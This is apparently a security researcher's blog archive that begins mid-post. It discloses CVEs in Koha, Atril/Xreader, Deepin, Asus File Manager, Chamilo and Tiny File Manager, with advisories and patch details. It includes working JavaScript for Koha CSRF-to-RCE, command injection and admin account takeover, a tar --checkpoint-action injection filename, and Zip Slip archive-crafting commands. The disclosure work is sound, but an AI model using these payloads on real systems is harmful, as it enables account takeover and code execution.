    request.open( "POST", "http://library.kali.local:8001/cgi-bin/koha/plugins/plugins-upload.pl", true );

    formData.append( "uploadfile", blob, "feb.kpz" );
    formData.append("op","Upload");
    request.send(formData);
   }

csrf_to_rce();
fetct("/cgi-bin/koha/plugins/plugins-enable.pl?class=Koha::Plugin::Rce&method=enable"); //Plugin Enable

```
----------------------------------------------------------------

This above Javascript code will directly upload plugin without Account takeover.
The plugin will execute whoami command and stores it's output to /tmp/encode

3. I have created working JS code for Command Injection and Account takeover as well

rce.js:

-----------------------------------------------------------
```
fetch("/cgi-bin/koha/tools/scheduler.pl").then(response => response.text()).then((response) => {
window.server_time = response.match(/([0-9]{2}:[0-9]{2})/)[1];

var cmd = "whoami >/tmp/xss_sh";
var b64cmd = encodeURIComponent(btoa(cmd));
var inject = "echo+"+b64cmd+"|base64+-d|bash"
var hour = server_time.split(":")[0];
var min = server_time.split(":")[1];

if (Number(min)+2 > 60){
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = String(Number(hour)+1)

fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
} else {
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = hour
fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
}
 }).catch(err => console.log(err))

```
-----------------------------------------------------------

This above code will fetch server time from the target and schedules a task(server time + 2 minutes) with the arbitrary injected command.

xsrf_ato.js (Account takeover):

-------------------------------------------------------------
```
fetch("/cgi-bin/koha/members/member-password.pl?member=1").then(response => response.text()).then((response) => {window.csrf_token = response.match(/value=\"(.{92})\"/)[1];
const xhr = new XMLHttpRequest();
xhr.open("POST","/cgi-bin/koha/members/member-password.pl",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send("destination=&borrowernumber=1&member=1&newuserid=admin&newpassword=Koha@pwn1234&newpassword2=Koha@pwn1234&csrf_token="+csrf_token);
}).catch(err => console.log(err))

```
-------------------------------------------------------------

This above JS will steal the CSRF token and performs a password reset. It sets admin:Koha@pwn1234 as Admin Staff credentials.

Thanks for reading,
Febin

```

# [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)

[17th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/#respond)

*A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.*

My 9th and 11th CVEs

**Affected Operating Systems:**

Linux Mint
Kali Linux (Popular OS among Security professionals, and researchers)
Parrot OS (Popular OS among Security professionals, and researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers) and Xreader Document Viewer (Default doc reader in Linux Mint)

**Vulnerability Summary:**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Linux Mint Xreader. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of CBT files. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user.

This vulnerability is due to a bad code segment in Atril and Xreader responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause – Vulnerable Code segment in both doc viewers (comics-document.c):

```

static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
    {"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
    {NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
    {"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
    {NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
    {"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

    /* UNARCHIVER */
    {"unar -o -"        , "%s %s"          , NULL         , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /\* tar \*/ section, it actually calls the following shell command, “tar -xOf -tf ![]()“. This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program ‘–checkpoint-action’ to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like ‘–checkpoint-action=EXEC=bash -c “whoami>/tmp/who.txt”;.jpg’.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril and Xreader are forks of Evince, this vulnerability was present in both Atril and Xreader. Atril’s team fixed the vulnerability at that time by adding a piece of code that quits Atril’s process if the CBT file with “–checkpoint-action=” in its name. The following was the patch (comics-document.c) (line – 983):

```

extract_argv (EvDocument *document, gint page)
{
    ComicsDocument *comics_document = COMICS_DOCUMENT (document);
    char **argv;
    char *command_line, *quoted_archive, *quoted_filename;
    GError *err = NULL;

    if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
    {
        g_warning ("File unsupported\n");
        gtk_main_quit ();
    }

```

As you can see, it throws a “File Unsupported” message to the console and quits when it sees “–checkpoint-action=” in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the “gtk\_main\_quit ();” function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

In Linux Mint (Cinnamon Desktop Environment), the target user must open the document to trigger the payload because Linux Mint uses Xreader and Xreader doesn’t have a previewer.

**Exploit**: <https://github.com/febinrev/atril_cbt-inject-exploit.git>

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

**Github Advisory on MATE Atril**: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

**Zero Day Initiative Advisory on Mint Xreader**: <https://www.zerodayinitiative.com/advisories/ZDI-23-1836/>

Thanks for Reading!

# [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)

[17th January 202417th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/#respond)

My 8th and 10th CVEs

**Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution**

### CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):

RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux’s MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu, and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn’t stop an attacker from achieving Remote Command Execution on the target system.

I named this vulnerability “*Slippy-Book*“

**Severity**: CRITICAL

**Impact**: Remote Command Execution, System compromise

This can be used particularly against security researchers who mostly use Kali and Parrot OS and also desktop users who use Linux Mint.

Remote Command Execution can be achieved in many ways:

1. The most efficient way to achieve RCE is by placing a malicious .desktop entry under $HOME/.config/autostart/ directory, and the .desktop will execute when the user logs out and logs back in, the autostart/ directory acts as the startup folder in Windows, and it will execute all the .desktop entries that are present inside at startup. We can place an infinite number of .desktop files with random names under autostart/ directory to achieve RCE, no need to overwrite any file.
2. By writing the authorized\_keys file under the .ssh/ directory inside the user’s home, in this way, an attacker can immediately achieve Command Execution via SSH if the target system has SSH enabled.
3. RCE can be achieved in another way just by writing files like .bash\_profile, .bash\_login, .zshrc, .cshrc, .vimrc, .xsession under the user’s home directory. Many of these files might be missing in operating systems, it depends on the OS. In Ubuntu-mate and Linux Mint, .bash\_profile, and .bash\_login files won’t be present, and placing those files with malicious commands written inside under the user’s home directory will result in RCE if the user logs in to the system without GUI mode, like SSH login.
4. Another way to achieve control over the target system is by writing files in places like ~/.local/bin, ~/.local/lib/python3.9/site-packages/, ~/.local/lib/python3.10/site-packages/, ~/.local/lib/python3.11/site-packages/, ~/.local/share/applications/, /var/www/html/, /var/www/ and so on.

**[+] Finding the Vulnerability:**

I was researching archive file formats such as Zip, Tar, Rar, etc., and the software that works with archives, then I got the idea to get into the Ebook file format (.epub) because .epub files are really Zip archives with some XML, HTML and other files packed inside. Even though Epub files are just zip files, epub format has its own standards.

**[\*] How did I find the vulnerability?**

People have been exploiting Archives since the early 2000s, researchers are constantly looking into Archives and archiving software for vulnerabilities and Zero-day acquisition companies like Zerodium are willing to pay million-dollar bounties for zero-days in archives and archivers. So, I thought to give it a try. I am not a binary ninja or kernel exploitation specialist to pull off a highly complicated exploit chain that could give me a code execution or elevation of privilege. My approach was, “What is the dumbest thing that could possibly work”.

Path traversal is one of the most common vulnerabilities that affect Archives and software that deals with archives, Zip Slip is one such vulnerability that leads to arbitrary file overwrite and Code execution that was disclosed on the 5th of June 2018 by the Snyk Security team, Zip Slip was a widespread vulnerability affected many software and libraries that handle Zip archives. Path traversal in zip archives was an ancient bug in the wild even before that was disclosed by the Snyk Security team. It is still present in many software including some Android file managers.
Another such vulnerability was discovered in WinRar with the CVE Id CVE-2018-20250, in which a potential path traversal can be exploited to achieve RCE.

Archives were developed in a period when people not much cared about security, and that’s where all the problems began.

Knowing that Path traversals can be a problem in the archive, I started testing it out on EPUB. I started off by downloading a sample .epub file from the internet and started playing with it. Then I did something really interesting, I added my own files into the .epub file by using the “zip -u” command.

`$ zip -u sample1.epub hello.txt`

And then when I listed the contents of the EPUB archive using “unzip -l”, I was able to see my hello.txt was present inside the EPUB. Perfect! So what’s next? As I said above, my approach was, “What is the dumbest thing that could possibly work” so what I did next was add a bunch of Path Traversal gadgets (../../) at the beginning of my filename hello.txt.

I was using Kali Linux and logged in as root during the research on archives.
Then, I navigated to the directory graphically and clicked on the EPUB document, the document opened up and nothing happened but after that, I noticed something really interesting, the hello.txt file was present under my Kali Linux’s root (/). I tried overwriting existing files but that didn’t work.

Then, I tried changing the filename to something like ../../../../tmp/test.txt and that worked too, a file named test.txt was successfully created under /tmp upon opening the epub document. First I thought it was a vulnerability in Kali Linux and downloaded the latest ISO of Kali from their official site and built a VM to test it out. Guess what? It worked on the latest version of Kali too. The software responsible for opening epub files in Kali is Atril, I then went to Google to read more about Atril Document Viewer and found out that it is the default Document reader for MATE desktop environment. After knowing that, I immediately switched to my Parrot OS VM to reproduce the same vulnerability, and that worked in Parrot OS as well. I also tested it out on Ubuntu’s MATE variant called Ubuntu-MATE and found that it was also vulnerable. The MATE desktop environment itself is vulnerable.

I also tried to reproduce this on various other Linux distros with other Desktop Environments and found out that Linux Mint is also vulnerable.

#### [+] Achieving Remote Command Execution:

This vulnerability can’t be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn’t stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized\_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn’t everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that’ll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there’s a small problem, the target user’s username is required for successful exploitation of this bug. What if we don’t know the username? No Easy RCE? Needs to guess Username? Needs to try random common usernames? Let’s see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user’s home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit\_rce.sh) and a script to write and include custom files for path traversal (exploit\_file\_write.sh).

**Exploit**: <https://github.com/febinrev/slippy-book-exploit.git>

**Zero Day Initiative Advisory:** <https://www.zerodayinitiative.com/advisories/ZDI-23-1835/>

*Update the Document Viewers to the latest version on your Distros!*

Thanks for Reading.

# [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/#respond)

**Zip Path traversal(ZipSlip) to arbitrary file write/overwrite in Asus default Android FileManager affecting all Asus Smartphones.**

This vulnerability is found in the latest version of the default file manager of Asus smartphones which comes pre-installed with the devices and also can’t be uninstalled. An attacker can create a crafted zip archive with path traversal to write/overwrite files in arbitrary locations on the target Smartphone. This vulnerability is dangerous as this can be abused to overwrite targetted files on the victim device or overwrite files that have patterns in the filenames like the photos taken from the camera, WhatsApp audio messages, WhatsApp Voice notes, Telegram Files, and much more. Also, Asus FileManager doesn’t prompt user confirmation before overwriting existing files which makes it easier for an attacker to exploit the vulnerability to overwrite existing files on the victim’s device.

**Severity**: *HIGH*

Affected Software and Version: Asus File Manager(com.asus.filemanager) <= 2.8.0.85\_230220 latest

**Proof-Of-Concept:**

1. Craft a path-traversal zip archive (here I created it on my Linux machine)

`$ echo PWNED > 001001001001001sdcard1poc1pwn.txt`

`$ zip trav.zip 001001001001001sdcard1poc1pwn.txt`

`$ sed -i s/"0"/"."/g trav.zip`

`$ sed -i s/"1"/"\/"/g trav.zip`

2. Transfer the zip file (trav.zip) to the Asus or Tecno device.
3. Open the archive and extract it with the default file manager
4. You will be able to see a file named pwn.txt under /sdcard/poc/pwn.txt

**Tested Devices:**

Asus Rog phone 5 and other devices with Asus Filemanager installed

# [CVE-2023-50255: Critical RCE Vulnerability in Deepin Linux’s default Archiver.](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/#respond)

## Zip Path Traversal (ZipSlip) in Deepin-Compressor

This is my 7th Published CVE.

## Description

Deepin-Compressor is the default archive manager of Deepin Linux OS. A path traversal vulnerability in deepin-compressor can be exploited to achieve Remote Command Execution on the target system upon opening crafted archives.

### Details

While decompressing/extracting zip archives, deepin-compressor is not validating the file names. Adding one or more “../” as prefixes to the filenames will lead to path traversal. This leads to arbitrary file write and RCE.

### PoC

Steps to create such zip archive:

1. Create a file for traversal

```

echo "TEST" > XXYXXYXXYtmpYpoc.txt

```

2. Make a normal zip archive

```

zip poc.zip XXYXXYXXYtmpYpoc.txt

```

3. Craft malicious archive

```

sed -i s/"XXY"/"..\/"/g poc.zip
sed -i s/"tmpY"/"tmp\/"/g poc.zip

```

By following the above steps, you can create a malicious zip archive, upon extracting that archive, a file named poc.txt will be created under /tmp directory

### Impact

Remote Command Execution: By exploiting the vulnerability an attacker can place malicious desktop entries under ~/.config/autostart to achieve RCE on the target

**Fix**: If you’re using Deepin Linux, update deepin-compressor to the latest version 5.12.21

# [CVE-2023-50254: Critical RCE in Deepin Linux Desktop OS’s default document reader](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/)

[22nd December 202322nd December 2023](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/#respond)

This is my 6th published CVE.

### Summary

Deepin Linux’s default document reader “**deepin-reader**” software ***<** **6.0.7***suffers from a serious vulnerability due to a design flaw that leads to Remote Command Execution via crafted docx document.

### Details

Deepin-reader is the default document reader for the Operating System Deepin Linux. The deepin-reader performs some shell command operations while dealing with docx document format.

1. When opening a docx document, deepin-reader creates a temporary directory under /tmp and place the docx document under the directory
2. Then deepin-reader calls the “unzip” shell command to extract the docx file
3. After the extraction process, deepin-reader calls “pandoc” command to convert the docx file to an HTML file named “temp.html” under word/ directory (created when the docx file is extracted with unzip).
   The command will look something like this, “pandoc temp.docx -o word/temp.html
4. Then deepin-reader will try to convert that HTML file to PDF and open the pdf.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/12/image.png?w=1024)

This happens when we open a docx file in Deepin Linux OS.

This behavior can be exploited by placing a symlink named word/temp.html inside a crafted malicious docx pointing to any file inside the target system.

So, while opening the docx file, pandoc will write to the system file that the symlink word/temp.html is pointing to.

This is a File overwrite vulnerability.
A Remote Code Execution can be achieved by overwriting files like .bashrc, .bash\_login etc. Rce will be triggered when the user opens the terminal.

We can force pandoc to write/overwrite files(.bashrc) in the right format to execute arbitrary commands.

**Advisory:** <https://github.com/linuxdeepin/developer-center/security/advisories/GHSA-q9jr-726g-9495>

Update Deepin Linux and deepin-reader to the latest version.

**Download the PoC exploit**: [https://github.com/febinrev/deepin-linux\_reader\_RCE-exploit/](https://github.com/febinrev/deepin-linux_reader_RCE-exploit/tree/main)

# [CVE-2021-40662 Chamilo LMS 1.11.14 RCE](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/)

[22nd March 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/#respond)

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/03/exploit-300x157-1.jpg?w=300)

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

<https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues#Issue-79-2021-07-17-Moderate-impact-Low-risk-CSRF-in-global-chat-and-social-wall>

**Disclosure Timeline:**

July 27, 2021 – Contacted the vendor and reported the vulnerability

July 28, 2021 – Vendor replies back

August 2, 2021 – Vulnerability has been patched in version **1.11.16**

March 21, 2022 – CVE ID was assigned. CVE-2021-40662

**CVE Description**: *Chamilo LMS v1.11.14 was discovered to contain a zero click code injection vulnerability which allows attackers to execute arbitrary code via a crafted plugin. This vulnerability is triggered through user interaction with the attacker’s profile page.*

* One-Click Technique: An Attacker who has a student account can create a malicious web page or a malicious SVG image file and upload the file to the “My Productions” section of the student profile page, then he can copy the URL of that file and send it to the Chamilo Admin User. When the Admin user loads the file in his browser with an active chamilo session, in the background it will upload a plugin (.zip file) to chamilo. Then the attacker can simply navigate to /plugin/exploited-directory/ and execute malicious commands.
* “Zero Click” technique: In this case, the attacker abuses the “My Diplomas” feature and injects malicious javascript in it, and when the Admin visits the Attacker’s (student) profile page or Portfolio, the malicious javascript gets executed and the malicious plugin gets uploaded to the server. After that, the attacker can simply navigate to /plugin/exploit/ directory and execute the shell.php script and execute arbitrary commands. Advantages of this exploit: No need to upload a malicious file to /app/upload/users/ directory , No need to send a link or URL to the Admin. When the admin visits attacker’s profile, the attacker gets the RCE 😉 .

**Reference**: <https://github.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE>

**Video Reference**:

<https://github.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/raw/main/chamilo_csrf-rce_exploit.mp4>

**Exploit Code:** <https://raw.githubusercontent.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/main/zero-click.ht>

**Remediation:**

The Vulnerability has been patched from version 1.11.16

[<https://github.com/chamilo/chamilo-lms/commit/c75b06adb816565e63f0738c028bd870c49b4de9>](https://github.com/chamilo/chamilo-lms/commit/c75b06adb816565e63f0738c028bd870c49b4de9)

Thanks

# [Tiny File Manager Authenticated RCE](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

[23rd January 202215th March 2022](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/#respond)

**CVE-2021-45010**

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of which was a software named “[Tiny File Manager](https://github.com/prasathmani/tinyfilemanager)“. While poking around I was able to find an awesome vulnerability in the application that leads to code execution on the server. This article is going to be on that vulnerability.

**Disclosure Timeline:**

A similar Vulnerability was also reported by another researcher named “Omri Inbar”.

My disclosure timeline:

September 16, 2021 – Contacted the developer and reported the vulnerability

September 17, 2021 – Developer replies back

September 20, 2021 – Developer verified the issue

September 26, 2021 – I patched the source code, fixed the RCE, and sent a pull request to the original repository.

November 12, 2021 – The developer merged the commit. The vulnerability has been fixed.

**CVE-2021-45010**: A Path traversal vulnerability in the file upload functionality in tinyfilemanager.php in Tiny File Manager Project’s Tiny File Manager <= 2.4.3 allows remote attackers with valid user accounts to upload malicious PHP files to the webroot and achieve code execution on the target server.

**Vendor/Software Details**

TinyFileManager is a web-based file manager and it is a simple, fast, and small file manager with a single file, a multi-language ready web application for storing, uploading, editing, and managing files and folders online via the web browser. The Application runs on PHP 5.5+, It allows the creation of multiple users and each user can have its own directory and build-in support for managing text files with cloud9 IDE and it supports syntax highlighting for over 150+ languages and over 35+ themes.

Link: <https://github.com/prasathmani/tinyfilemanager>

**Authenticated RCE**

Tiny File Manager is a php based software. This particular vulnerability is present in the tinyfilemanager.php script. When the user logs in to the application, he is allowed to upload, download, edit files and those file are stored in a specific directory which is been specified in “config.php”. The particular vulnerability that I have found allows the user to upload files beyond the specified directory by tampering the “fullpath” parameter and add a bunch of “../” in front of the actual filename thus leads to breaking out of the file root directory that is specified in config.php.

This can be exploited to place php web-shells inside the web root directory of Tiny File Manager and achieve RCE.

Proof Of Concept:

*RCE*
1. An Attacker who has admin credentials or admin access to “Tiny FIle manager” app can upload arbitrary files to the server via Path Traversal i.e, appending “../../../../../../../” to the “fullpath parameter in the upload feature.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce.png?w=1024)

2. If the attacker could get the full Web Root directory of the “Tiny File Manager” app, he could upload php files there to achieve RCE.

3. To get the full Webroot directory path, we can abuse a path disclosure vulnerability in the URL upload feature. When a random rubbish URL is given as input, it throws an error message that reveals the full Webroot directory path.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_disclose.png?w=1024)

4. By combining these, we can achieve Command execution on the server.

I created an exploit script that automatically exploits the bug and get a shell:

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce3.png?w=1024)

Download the Exploit: *<https://raw.githubusercontent.com/febinrev/tinyfilemanager-2.4.3-exploit/main/exploit.sh>*

**The Patch:**

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA=w484-h87)](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA%3Ds1232)

<https://github.com/prasathmani/tinyfilemanager/pull/636/files/a93fc321a3c89fdb9bee860bf6df5d89083298d1>

👉  *Replace “./” with “\_” fixes the issue.*

**Thank You**

# [Critical CSRF in FileBrowser](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

